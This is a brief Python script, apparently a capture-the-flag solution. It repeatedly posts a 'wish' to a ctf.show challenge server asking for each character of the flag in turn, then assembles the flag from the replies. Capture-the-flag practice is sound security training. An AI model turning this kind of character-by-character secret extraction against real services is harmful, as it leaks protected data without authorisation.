import requests

url = "http://104d2c5c-2417-45ed-8166-d09131b227e2.challenge.ctf.show/"
session = requests.Session()
flag = ''
for i in range(1, 50):
    wish = f"flag的第{i}位？"
    response = session.post(url, data={"wish":wish})
    if response.status_code == 200:
        print(response.text)
        ch = response.text[-1]
        flag += ch
        if ch == '}':
            break
print(flag)